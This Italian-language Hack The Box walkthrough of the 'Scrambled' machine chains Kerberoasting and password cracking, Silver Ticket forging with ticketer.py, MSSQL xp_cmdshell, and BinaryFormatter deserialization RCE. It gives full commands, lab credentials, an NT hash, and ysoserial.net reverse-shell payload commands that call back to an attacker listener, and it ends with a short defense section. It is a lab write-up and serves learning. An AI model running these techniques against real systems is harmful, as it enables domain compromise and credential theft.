---
title: 'HTB Scrambled Walkthrough: Silver Ticket e .NET Deserialization'
slug: htb-scrambled-walkthrough
description: 'Writeup HTB Scrambled: Kerberoasting, Silver Ticket su MSSQL e RCE via BinaryFormatter insecure deserialization. Analisi statica con dnSpy e ysoserial.net'
image: /scrambled-walktrough-htb.webp
draft: false
date: 2026-06-05T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - htb-scrambled
  - hack-the-box-scrambled-walktrough
---

Scrambled è una macchina/vm Windows di HTB (Hack The Box) che disabilita completamente NTLM e forza l'autenticazione Kerberos su tutto. Questo rompe la maggior parte dei tool standard — nxc, smbmap, impacket con flag sbagliati — se non si capisce come funziona Kerberos a basso livello. La parte finale è una deserializzazione insicura via `BinaryFormatter` su un servizio .NET custom, analizzata staticamente con dnSpy.

|                |                                                                                                              |
| -------------- | ------------------------------------------------------------------------------------------------------------ |
| **Difficoltà** | Medium                                                                                                       |
| **OS**         | Windows                                                                                                      |
| **Temi**       | Kerberos-only, Kerberoasting, Silver Ticket, MSSQL, Insecure Deserialization, BinaryFormatter, ysoserial.net |

\--- Questo rompe la maggior parte dei tool standard — nxc, smbmap, impacket con flag sbagliati — se non si capisce come funziona Kerberos a basso livello. La parte finale è una deserializzazione insicura via `BinaryFormatter` su un servizio .NET custom, analizzata staticamente con dnSpy.

***

## Fase 1 – Enumerazione

```bash
sudo mynmap 10.129.8.212
```

[mynmap](https://github.com/hack-ita/mynmap) è un wrapper custom per nmap pensato per i CTF: esegue automaticamente 4 fasi in sequenza — discovery TCP veloce, service/OS detection con script, vulnerability check sui porti comuni, e UDP scan sui candidati più rilevanti. Tutto in un comando, senza dimenticarsi nulla. Output:

```
[*] PHASE 1: Fast TCP port discovery...
[+] TCP ports found: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,...

[*] PHASE 2: Service and OS detection...
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: scrm.local)
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 RTM
4411/tcp open  found?       SCRAMBLECORP_ORDERS_V1.0.3;
5985/tcp open  http         Microsoft HTTPAPI (WinRM)

[*] PHASE 4: Smart UDP scan...
[+] UDP confermati OPEN: 53,88,123,389
```

Porte rilevanti:

* **88** – Kerberos → siamo su un DC
* **389/636** – LDAP/LDAPS
* **445** – SMB (risponde ma senza NTLM, come vedremo)
* **1433** – MSSQL
* **5985** – WinRM → accesso remoto possibile se troviamo credenziali
* **4411** – servizio sconosciuto, banner testuale `SCRAMBLECORP_ORDERS_V1.0.3;`

### /etc/hosts

```
10.129.8.212 scrm.local DC1.scrm.local
```

### krb5.conf

```ini
[libdefaults]
default_realm = SCRM.LOCAL

[realms]
SCRM.LOCAL = {
    kdc = DC1.scrm.local
}

[domain_realm]
.scrm.local = SCRM.LOCAL
scrm.local = SCRM.LOCAL
```

***

## Fase 2 – Ricognizione e primo accesso

### Porta 4411

Prima cosa: connessione alla porta sconosciuta.

```bash
nc -nv 10.129.8.212 4411
```

Risposta: `SCRAMBLECORP_ORDERS_V1.0.3;`

Servizio testuale custom. Senza sapere i comandi, si prova a enumerare con ffuf e tecniche di fuzzing — nessun risultato utile. Si capisce che i comandi validi non sono indovinabili a caso: serve analisi del codice. Si lascia da parte per ora.

### Sito web – porta 80

Navigando sul sito aziendale emerge:

* NTLM è stato disabilitato a causa di un attacco NTLM relay subito in precedenza
* La policy di reset password prevede che la nuova password sia uguale allo username
* In uno screenshot della sezione IT Support si vede il percorso `C:\Users\ksimpson>` — username trovato
* La pagina `/salesorders.html` descrive l'applicazione Sales Order Client e menziona esplicitamente la porta 4411 e un'opzione "Enable debug logging" — primo indizio concreto su cosa gira su quella porta

Si tenta `ksimpson:ksimpson` via Kerberos:

```bash
kinit ksimpson@SCRM.LOCAL
# password: ksimpson
klist
```

TGT ottenuto. Si enumera SMB:

```bash
nxc smb 10.129.8.212 -u ksimpson -p ksimpson -k --shares
```

Output:

```
SMB  10.129.8.212  445  DC1  ADMIN$          Remote Admin
SMB  10.129.8.212  445  DC1  C$              Default share
SMB  10.129.8.212  445  DC1  HR              
SMB  10.129.8.212  445  DC1  IPC$    READ    Remote IPC
SMB  10.129.8.212  445  DC1  IT              
SMB  10.129.8.212  445  DC1  NETLOGON READ   Logon server share
SMB  10.129.8.212  445  DC1  Public  READ    
SMB  10.129.8.212  445  DC1  Sales           
SMB  10.129.8.212  445  DC1  SYSVOL  READ    Logon server share
```

`ksimpson` legge solo `Public`. Dentro c'è un PDF — `Network Security Changes.pdf` — che conferma:

* NTLM disabilitato su tutta la rete
* Accesso SQL rimosso a tutti tranne agli amministratori di rete

***

## Fase 3 – Kerberoasting

Il PDF menziona un database SQL compromesso. Si cercano account con SPN associati a MSSQL:

```bash
GetUserSPNs.py scrm.local/ksimpson:ksimpson \
  -request -dc-host DC1.scrm.local -k -no-pass
```

**Nota:** si usa `-dc-host` (FQDN) e non `-dc-ip`, perché con NTLM disabilitato impacket deve costruire l'SPN dal nome host. Con l'IP fallisce.

Si ottiene hash TGS per `sqlsvc` (SPN: `MSSQLSvc/DC1.scrm.local:1433`).

Crack con hashcat (modalità 13100, guida su [hashcat per password cracking](https://hackita.it/articoli/hashcat/)):

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Risultato: `sqlsvc:Pegasus60`

***

## Fase 4 – Silver Ticket

Come dice il PDF: solo i network admin accedono a SQL. `sqlsvc` è l'account di servizio che **esegue** MSSQL — non è detto che abbia un login SQL configurato. E infatti non ce l'ha.

La soluzione è un **Silver Ticket**: forgiare direttamente un TGS per il servizio MSSQL impersonando `Administrator`, senza coinvolgere il KDC. Il ticket è cifrato con la chiave del service account — e noi abbiamo quell'hash.

### Differenza tra TGT e Silver Ticket

* **TGT**: lo ottieni dal KDC con le tue credenziali. È il punto di partenza per richiedere ticket di servizio.
* **Silver Ticket**: forgi direttamente un TGS per un servizio specifico, usando l'hash NT del service account. Nessuna richiesta al KDC. Invisibile ai log del DC.

### Ingredienti necessari

* Hash NT di `sqlsvc` → `b999a16500b87d17ec7f2e2a68778f05` (derivato da `Pegasus60`)
* Domain SID
* SPN del servizio

### Ottenere il Domain SID

```bash
getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson
# Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

### Forgiare il ticket

```bash
ticketer.py \
  -nthash b999a16500b87d17ec7f2e2a68778f05 \
  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 \
  -domain scrm.local \
  -spn MSSQLSvc/DC1.scrm.local:1433 \
  Administrator
```

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -no-pass -k DC1.scrm.local -target-ip 10.129.8.212
```

Accesso come `SCRM\administrator` su MSSQL.

***

## Fase 5 – Enumerazione MSSQL

```sql
SELECT name FROM sys.databases;
-- ScrambleHR

USE ScrambleHR;
SELECT name FROM sys.tables;
-- Employees, UserImport, Timesheets

SELECT * FROM UserImport;
```

Credenziali in chiaro nella tabella `UserImport`:

```
MiscSvc : ScrambledEggs9900
```

### Shell via xp\_cmdshell

```sql
enable_xp_cmdshell
xp_cmdshell "whoami"
-- scrm\sqlsvc
```

Si ottiene una reverse shell come `sqlsvc` tramite payload PowerShell in base64. La shell gira con i privilegi di `sqlsvc` — account di servizio, nessun privilegio elevato utile. Niente di interessante da qui.

***

## Fase 6 – Accesso come miscsvc

Con le credenziali trovate in MSSQL si accede via WinRM Kerberos:

```bash
kinit miscsvc@SCRM.LOCAL
# password: ScrambledEggs9900

export KRB5CCNAME=/tmp/krb5cc_1000
evil-winrm -i DC1.scrm.local -r SCRM.LOCAL
```

Shell come `scrm\miscsvc`. `user.txt` si trova nel desktop.

***

## Fase 6b – BloodHound CE

Prima di procedere si lancia BloodHound CE per mappare il dominio e cercare percorsi di privilege escalation:

```bash
bloodhound-ce-python -d scrm.local -u 'sqlsvc' -p 'Pegasus60' \
  -ns 10.129.8.212 -dc DC1.scrm.local -c all --zip \
  -k --disable-autogc --dns-tcp --use-ldaps
```

Ripetuto anche con `ksimpson` e `miscsvc`. Nessun path interessante — niente ACL abusabili, niente delegation, niente DA reachable in modo diretto per nessuno dei tre utenti.

A questo punto è chiaro che la strada non passa da AD ma dall'applicazione custom in ascolto sulla 4411. Si va su dnSpy.

***

## Fase 7 – Analisi statica con dnSpy

Nella share `IT` (accessibile come `miscsvc`) si trovano `ScrambleClient.exe` e `ScrambleLib.dll` in `Apps\Sales Order Client`.

Si analizza la DLL con **dnSpy**, decompilatore per assembly .NET che converte il binario in codice C# leggibile.

### Come navigare dnSpy

In Assembly Explorer, espandi **ScrambleLib** — le classi custom. Ignora tutto il resto (`ScrambleLib.My`, `Type References`, ecc.) — boilerplate VB.NET autogenerato, non interessante.

### Regola base per leggere codice da hacker

Non serve capire tutto — serve trovare il percorso dall'input esterno alla funzione pericolosa. Cerca:

* **Input dall'esterno** — quello che arriva dalla rete, da parametri, da file
* **Funzioni pericolose** — `Deserialize`, `Execute`, `Process.Start`, `eval`
* **Confronti su credenziali** — `string.Compare`, `==` su username/password
* Il resto è codice di supporto — ignoralo

> Regola per l'ethical hacker: non serve capire tutto il codice — serve trovare il percorso dall'input alla funzione pericolosa.

***

### ScrambleNetShared – il protocollo

Prima classe da aprire. Contiene solo costanti:

```csharp
public const string CODE_LOGON = "LOGON";
public const string CODE_UPLOAD_ORDER = "UPLOAD_ORDER";
public const string CODE_LIST_ORDERS = "LIST_ORDERS";
public const string CODE_QUIT = "QUIT";
public const char MessagePartSeparator = ';';
public const char ContentListSeparator = '|';
public const int ServerPort = 4411;
```

`public const` = variabile pubblica con valore fisso che non cambia mai.

Questa classe ci dà il protocollo completo — i comandi, i separatori, la porta. Tutto quello che vedevamo connettendoci con `nc` era definito qui.

***

### ScrambleNetClient.Logon – developer backdoor

```csharp
// dentro la classe ScrambleNetClient
public bool Logon(string Username, string Password)
{
    if (string.Compare(Username, "scrmdev", true) == 0)
    {
        Log.Write("Developer logon bypass used");
        result = true;  // ← ritorna true senza verificare nulla
    }
}
```

`string.Compare(Username, "scrmdev", true)` confronta l'username con la stringa `"scrmdev"` ignorando maiuscole/minuscole.

Se corrisponde → ritorna `true` direttamente, senza mandare nulla al server. La password viene completamente ignorata.

Questo bypass esiste solo nel client — il server non sa niente di `scrmdev`.

***

### SalesOrder – la classe serializzabile

```csharp
[Serializable]  // ← permesso di serializzazione
public class SalesOrder
{
    public string ReferenceNumber { get; set; }
    public string QuoteReference { get; set; }
    public string SalesRep { get; set; }
    public List<string> OrderItems { get; set; }
    public DateTime DueDate { get; set; }
    public double TotalCost { get; set; }
}
```

`[Serializable]` è un attributo — dice a .NET "questa classe può essere serializzata/deserializzata". Senza di esso `BinaryFormatter` rifiuta di toccarla.

I campi sono solo dati: testo, lista, data, numero. Niente di eseguibile — non è qui la vulnerabilità.

***

### SalesOrder.DeserializeFromBase64 – il punto vulnerabile

```csharp
// dentro la classe SalesOrder
public static SalesOrder DeserializeFromBase64(string Base64)
{
    byte[] buffer = Convert.FromBase64String(Base64);
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    using (MemoryStream memoryStream = new MemoryStream(buffer))
    {
        result = (SalesOrder)binaryFormatter.Deserialize(memoryStream);
    }
}
```

Riga per riga da ethical hacker:

**`Convert.FromBase64String(Base64)`** — converte il payload base64 che abbiamo mandato in bytes. Quei bytes finiscono in `buffer`.

**`new BinaryFormatter()`** — crea il deserializzatore. Da solo non fa niente — è la riga dopo che conta.

**`binaryFormatter.Deserialize(memoryStream)`** — qui parte tutto. Prende i bytes del nostro payload e li esegue senza controllare cosa contengono.

**`(SalesOrder)`** — il cast, avviene **dopo** la deserializzazione. Se l'oggetto non è un `SalesOrder` → errore. Ma il nostro codice è già stato eseguito prima.

***

### Come viene costruito il messaggio

```csharp
// dentro ScrambleNetClient
string text = ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + ";" + Request.Parameter + "\n";
streamWriter.Write(text);
```

Il client costruisce il messaggio concatenando comando + `;` + parametro. Questo spiega perché mandavamo `UPLOAD_ORDER;base64payload`.

***

### Flusso completo dall'input all'RCE

```
nc manda → UPLOAD_ORDER;AAEAAAD...base64payload

↓ server splitta sul ;

array[1] = "AAEAAAD...base64payload"  ← nostro input

↓

Convert.FromBase64String → bytes in buffer

↓

binaryFormatter.Deserialize(buffer)  ← codice eseguito qui

↓

(SalesOrder) cast → ERROR_GENERAL  ← ma è già troppo tardi

↓

shell come nt authority\system
```

***

## Fase 8 – Insecure Deserialization: teoria

### Cos'è la serializzazione — spiegazione da zero

Immagina di avere un oggetto in memoria: un ordine di vendita con numero riferimento, data, importo. Quel dato esiste solo nella RAM finché il programma gira.

**Serializzare** significa trasformare quell'oggetto in una sequenza di byte — per poterla salvare su disco, mandare in rete, o passarla a un'altra applicazione.

**Deserializzare** è il contrario: prendere quei byte e ricostruire l'oggetto originale in memoria.

Esempio concreto in C#:

```csharp
// L'app crea un ordine
SalesOrder order = new SalesOrder();
order.ReferenceNumber = "ORD-001";
order.TotalCost = 1500.00;

// Lo serializza in bytes → base64 per mandarlo in rete
BinaryFormatter bf = new BinaryFormatter();
MemoryStream ms = new MemoryStream();
bf.Serialize(ms, order);
string payload = Convert.ToBase64String(ms.ToArray());
// payload = "AAEAAAD/////AQAAAA..." (stringa base64)

// Il server riceve la stringa, la decodifica e ricostruisce l'oggetto
byte[] buffer = Convert.FromBase64String(payload);
SalesOrder ricevuto = (SalesOrder)bf.Deserialize(new MemoryStream(buffer));
// ricevuto.ReferenceNumber == "ORD-001" ✓
```

Fin qui tutto normale. Il problema nasce quando il server **non controlla cosa sta ricevendo**.

***

### Dov'è la vulnerabilità

`BinaryFormatter` è cieco. Quando riceve dei byte, li esegue fedelmente — non fa domande, non controlla il tipo, non valida nulla. Ricostruisce qualunque oggetto sia codificato in quei byte.

Il punto critico è questo: in .NET, alcuni oggetti durante la loro costruzione **eseguono codice automaticamente**. Ci sono classi che nel costruttore o nei metodi di inizializzazione chiamano operazioni di sistema — aprire file, lanciare processi, fare chiamate di rete.

Se costruisci un oggetto del genere e lo serializzi nel formato corretto, quando `BinaryFormatter` lo deserializza esegue quel codice — prima ancora che il programma possa verificare "aspetta, questo non è un SalesOrder".

Flusso normale:

```
Client manda: bytes[SalesOrder legittimo]
Server fa:    bf.Deserialize(bytes) → SalesOrder ✓
              cast a SalesOrder ✓
              usa i dati dell'ordine ✓
```

Flusso con exploit:

```
Attaccante manda: bytes[oggetto malevolo con cmd.exe incorporato]
Server fa:        bf.Deserialize(bytes) → ricostruisce l'oggetto
                  → durante la ricostruzione: cmd.exe viene eseguito ← RCE
                  cast a SalesOrder ✗ → ERROR_GENERAL
```

**Il cast fallisce**, quindi il server risponde con `ERROR_GENERAL`. Ma il comando è già partito — la shell è già aperta sul listener. Ecco perché in questo box vediamo l'errore ma la connessione arriva comunque.

***

### Cos'è un gadget chain

Le classi che, quando deserializzate, eseguono codice arbitrario si chiamano **gadget**. Non sono malware — sono classi normali di .NET Framework, WPF, PowerShell. Fanno cose legittime, ma se costruite nel modo giusto diventano vettori di exploit.

Una **gadget chain** è una sequenza di questi oggetti collegati tra loro, dove ognuno triggera il successivo, finché alla fine viene eseguito il comando voluto.

Gadget più comuni per `BinaryFormatter`:

| Gadget                        | Come funziona                                                                                            |
| ----------------------------- | -------------------------------------------------------------------------------------------------------- |
| `TextFormattingRunProperties` | Contiene XAML interno che viene parsato durante la deserializzazione, e quel XAML invoca `Process.Start` |
| `WindowsIdentity`             | Abusa del meccanismo di autenticazione Windows per invocare codice                                       |
| `TypeConfuseDelegate`         | Confonde il sistema dei tipi per eseguire un delegate arbitrario                                         |
| `PSObject`                    | Sfrutta l'engine di PowerShell — richiede PowerShell installato                                          |

Ogni gadget funziona solo se le DLL che usa sono caricate nel processo target. Per questo motivo si prova più gadget finché uno funziona.

***

### ysoserial.net — come funziona

ysoserial.net è un tool che fa una cosa sola: dato un comando da eseguire, genera i bytes serializzati nel formato corretto per triggerare un gadget specifico.

Non devi costruire il payload a mano — gestisce tutta la complessità della serializzazione .NET.

Parametri principali:

```
-f  → formatter: come sono serializzati i dati nell'app target
      (BinaryFormatter, SoapFormatter, Json.Net, XmlSerializer, ...)

-g  → gadget: quale classe .NET abusare
      (TextFormattingRunProperties, WindowsIdentity, PSObject, ...)

-o  → output format: raw, base64, hex
      (base64 per mandarlo come testo su rete)

-c  → command: il comando da eseguire sul sistema target

-t  → test: esegui il payload localmente per verificare che funzioni
```

Esempio — test locale per verificare il gadget (apre calc.exe):

```cmd
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "calc.exe" -t
```

Output: stringa base64 + calc.exe si apre sulla macchina locale → gadget funzionante.

Esempio — ping di verifica verso Kali (per confermare RCE prima della shell):

```cmd
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "ping -n 1 10.10.14.x"
```

Su Kali si mette in ascolto:

```bash
tcpdump -i tun0 icmp
```

Se arriva il ping → RCE confermato, si può mandare la shell.

Esempio — reverse shell PowerShell:

```cmd
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "powershell -e <BASE64_REVSHELL>"
```

Il payload generato è una stringa base64 lunga che contiene oggetti .NET serializzati — pronta da inserire nel comando `UPLOAD_ORDER;` del protocollo custom.

***

## Fase 9 – Exploit

### Generare il payload

ysoserial.net prende quattro parametri fondamentali:

* `-f` → formatter: il meccanismo di serializzazione usato dall'app target (`BinaryFormatter` in questo caso)
* `-g` → gadget: la classe .NET da abusare
* `-o` → output format: `base64` per inviarlo come testo
* `-c` → command: il comando da eseguire

```cmd
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 ^
  -c "powershell -e <BASE64_REVSHELL>"
```

**Gadget usato:** `TextFormattingRunProperties` — tra i più compatti disponibili per `BinaryFormatter`, non dipende da CVE specifici.

**Errore del primo tentativo:** con il gadget `PSObject` si otteneva:

```
ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type
'System.Management.Automation.PSObject' to type 'ScrambleLib.SalesOrder'
```

Il cast fallisce — ma il codice era già stato eseguito. Il problema era che `PSObject` non si comportava correttamente in questo contesto. `TextFormattingRunProperties` risolve il problema.

### Listener

```bash
nc -lvnp 80
```

### Invio del payload

Il server **non richiede autenticazione** per ricevere ordini — `LOGON` è un controllo implementato solo nel client, non nel server. Si può mandare `UPLOAD_ORDER` direttamente senza fare login:

```bash
nc 10.129.8.212 4411
UPLOAD_ORDER;<payload_base64>
```

**Nota sul debug log:** attivando il logging nell'app (`Tools > Enable Debug Logging`) viene creato `ScrambleDebugLog.txt` nella stessa cartella dell'exe. Il file mostra esattamente il formato dei comandi e la riga `Binary formatter init successful` — conferma diretta che il server usa BinaryFormatter per deserializzare.

Output dal server:

```
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown
by the target of an invocation.
```

**L'errore è atteso.** Il cast a `SalesOrder` fallisce — ma il codice malevolo è già stato eseguito durante la deserializzazione.

Sul listener:

```
connect to [10.10.14.x] from (UNKNOWN) [10.129.8.212]
whoami
nt authority\system
PS C:\Windows\system32>
```

`root.txt` si trova nel desktop di Administrator.

***

## Errori fatti durante la risoluzione

**1. Usare `-dc-ip` invece di `-dc-host` per GetUserSPNs**\
Con NTLM disabilitato, impacket deve costruire l'SPN dal FQDN. L'IP non basta.

**2. Confondere TGT e Silver Ticket**\
`kinit` dà un TGT. Il Silver Ticket è un TGS forgiato localmente con `ticketer.py` — nessuna richiesta al KDC, nessun log sul DC.

**3. KRB5CCNAME non riesportato**\
Aprendo un nuovo terminale la variabile sparisce. Va riesportata dopo ogni `kinit` o `kdestroy`.

**4. Gadget sbagliato**\
`PSObject` eseguiva il codice ma il cast falliva prima che la shell si aprisse. `TextFormattingRunProperties` è il gadget corretto per questo scenario.

**5. nxc mssql con NTLM disabilitato**\
Il modulo mssql di nxc fa sempre una discovery NTLM iniziale prima di autenticarsi, anche con `-k`. Con NTLM disabilitato crasha. Soluzione: usare direttamente `mssqlclient.py` con `-target-ip` per separare hostname da IP.

***

## Difesa

* Non usare `BinaryFormatter` — deprecato e insicuro per design. Alternative: `System.Text.Json`, `protobuf-net`, `MessagePack`
* Non deserializzare input utente senza firma crittografica e whitelist dei tipi accettati
* Monitorare event ID 4769 con encryption type 0x17 (RC4) su account privilegiati: Silver Ticket non genera TGT, quindi assenza di 4768 prima di 4769 è un segnale
* Ruotare regolarmente le password dei service account Kerberoastable
* Aggiungere account sensibili al gruppo Protected Users
